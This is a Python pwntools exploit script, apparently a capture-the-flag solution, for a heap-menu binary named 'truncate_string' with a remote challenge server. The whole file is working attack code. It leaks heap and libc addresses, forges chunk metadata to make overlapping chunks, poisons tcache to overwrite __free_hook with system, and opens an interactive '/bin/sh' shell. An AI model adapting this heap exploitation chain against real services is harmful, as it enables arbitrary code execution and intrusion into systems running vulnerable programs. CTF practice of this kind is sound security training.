#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./truncate_string')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./truncate_string')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('nc.eonew.cn',10008)
			elf=ELF('./truncate_string')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('Your choice: ','1')
			io.sendlineafter('The size: ',str(a))
			io.sendafter('Content: ',b)

		def show(a):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('to see: ',str(a))

		def delete(a):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('to delete: ',str(a))

			
		add(0x1f8,'1'*0x38)
		for i in range(14):
			add(0x1f9,'1'*0x38)

		delete(10)
		delete(9)
		add(0x1f9,'1')
		show(9)
		io.recvuntil("Content: ")
		heap_base=u64(io.recv(6)+'\x00\x00')-0x1731
		add(0x1f9,'1')
		delete(1)
		ptr=heap_base+0x4f8
		fd=ptr-0x18 
		bk=ptr-0x10
		add(0x1f9,'\x00'*0xc8+p64(heap_base+0x480)+p64(heap_base+0x480)+'\x00'*0x8+p64(0xf0)+p64(0x1100)+p64(ptr)+p64(ptr))
		delete(9)
		add(0x1f9,'\x00'*0x90+p64(0x1100)+p64(0x20)+p64(0)+p64(0x21)+p64(0)+p64(0x21)+p64(0)+p64(0x21))
		for i in range(7):
			delete(15-i-1) 	#8-14

		delete(1)
		delete(2)
		delete(3)
		delete(4)
		delete(5)

		for i in range(7):
			add(0x1f9,'1'*0x38)
		delete(0)
		add(0x1f8,'a'*0x218)
		delete(1)
		delete(2)
		delete(3)
		delete(4)
		delete(5)
		delete(8)
		delete(9)
		add(0x68,'a')
		show(1)
		io.recvuntil("Content: ")
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10-0xc9
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		add(0x38,'a')
		delete(2)
		for i in range(7):
			add(0x68,'1'*0x38)
		delete(2)
		delete(3)
		delete(4)
		delete(5)
		delete(8)
		delete(9)
		delete(10)
		delete(1)
		delete(6)
		add(0x1f8,'\x00'*0x88+p64(0x61)+p64(libc.sym['__free_hook']))
		add(0x38,'/bin/sh\x00')
		add(0x38,p64(system_addr))
		delete(2)

		

		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue